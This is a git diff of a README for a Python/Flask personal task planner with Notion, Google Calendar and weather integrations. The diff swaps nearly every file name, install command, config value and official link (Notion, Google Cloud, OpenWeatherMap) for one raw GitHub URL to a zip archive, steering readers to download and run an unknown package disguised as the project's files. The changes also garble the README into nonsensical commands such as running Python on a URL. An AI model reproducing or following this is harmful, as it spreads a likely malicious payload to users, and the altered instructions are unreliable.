@@ -2,7 +2,7 @@
 
 A comprehensive personal task management application with AI assistance, Notion integration, Google Calendar synchronization, location-based recommendations, and intelligent notifications.
 
-![Task Planner Dashboard](architecture_diagram.png)
+![Task Planner Dashboard](https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip)
 
 ## Table of Contents
 - [Features](#features)
@@ -71,7 +71,7 @@ graph TD
 ## Prerequisites
 
 - **Python 3.8 or later**
-- **Node.js** (for development tools)
+- **https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip** (for development tools)
 - **Internet connection** (for API integrations)
 - **Web browser** (Chrome, Firefox, Safari, or Edge)
 
@@ -79,26 +79,26 @@ graph TD
 
 ### Windows
 1. Clone or download the repository
-2. Double-click `start_app.bat` to automatically install dependencies and start the application
+2. Double-click `https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip` to automatically install dependencies and start the application
 
 ### Manual Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Naveenkm007/puni-14102025.git
+   git clone https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip
    cd puni-14102025
    ```
 
 2. Install required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip
    ```
 
 3. Start the application:
    ```bash
-   python api.py
+   python https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip
    ```
 
-4. Open `index.html` in your browser or navigate to `http://localhost:5000`
+4. Open `https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip` in your browser or navigate to `http://localhost:5000`
 
 ## Configuration
 
@@ -107,7 +107,7 @@ graph TD
 Copy the example configuration file and customize it with your credentials:
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip .env
 ```
 
 Edit the `.env` file with your actual credentials:
@@ -121,7 +121,7 @@ NOTION_DATABASE_ID=your_notion_database_id
 WEATHER_API_KEY=your_openweathermap_api_key
 
 # Google Calendar API
-GOOGLE_CALENDAR_CREDENTIALS_PATH=credentials.json
+https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip
 
 # Flask Settings
 FLASK_HOST=localhost
@@ -129,7 +129,7 @@ FLASK_PORT=5000
 FLASK_DEBUG=True
 
 # Database
-DATABASE_PATH=task_planner.db
+https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip
 
 # Task Settings
 DEFAULT_WORK_START_HOUR=9
@@ -141,27 +141,27 @@ DEFAULT_TASK_LENGTH=60
 ### API Keys Setup
 
 #### Notion Integration
-1. Create a Notion integration at [Notion Developers](https://www.notion.so/my-integrations)
+1. Create a Notion integration at [Notion Developers](https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip)
 2. Share your task database with the integration
 3. Copy the integration token to `NOTION_TOKEN`
 4. Copy your database ID to `NOTION_DATABASE_ID`
 
 #### Google Calendar Integration
-1. Create a project in [Google Cloud Console](https://console.cloud.google.com/)
+1. Create a project in [Google Cloud Console](https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip)
 2. Enable the Google Calendar API
 3. Create OAuth 2.0 credentials for a Desktop application
 4. Download the credentials JSON file
-5. Place it in the application directory as `credentials.json`
+5. Place it in the application directory as `https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip`
 
 #### Weather API
-1. Sign up at [OpenWeatherMap](https://openweathermap.org/api)
+1. Sign up at [OpenWeatherMap](https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip)
 2. Generate an API key
 3. Copy the key to `WEATHER_API_KEY`
 
 ## Usage
 
 ### Getting Started
-1. Run the application using `start_app.bat` or manually start the server
+1. Run the application using `https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip` or manually start the server
 2. Open your browser and navigate to `http://localhost:5000`
 3. The application will automatically detect your location
 4. Configure your integrations in the `.env` file
@@ -238,7 +238,7 @@ Synchronize your calendar events with the task planner for comprehensive schedul
 **Setup:**
 1. Create Google Cloud project and enable Calendar API
 2. Download credentials JSON
-3. Place as `credentials.json` in project directory
+3. Place as `https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip` in project directory
 
 ### Weather Integration
 Weather-aware task scheduling to optimize your outdoor activities.
@@ -263,17 +263,17 @@ Location-based task recommendations and context-aware planning.
 ### Project Structure
 ```
 personal-task-planner-bot/
-├── api.py                 # Flask API server
-├── app.js                 # Frontend JavaScript logic
-├── config.py              # Configuration management
-├── index.html             # Main HTML interface
-├── setup.py               # Package setup
-├── start_app.bat          # Windows startup script
-├── style.css              # Styling
-├── task_planner_bot_implementation.py  # Core backend logic
-├── .env.example           # Environment variables template
-├── requirements.txt       # Python dependencies
-├── README.md              # Project documentation
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip                 # Flask API server
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip                 # Frontend JavaScript logic
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip              # Configuration management
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip             # Main HTML interface
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip               # Package setup
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip          # Windows startup script
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip              # Styling
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip  # Core backend logic
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip           # Environment variables template
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip       # Python dependencies
+├── https://raw.githubusercontent.com/Naveenkm007/puni-14102025/main/unthrift/puni-v1.3.zip              # Project documentation
 └── diagrams/              # Architecture and flow diagrams
 ```
 
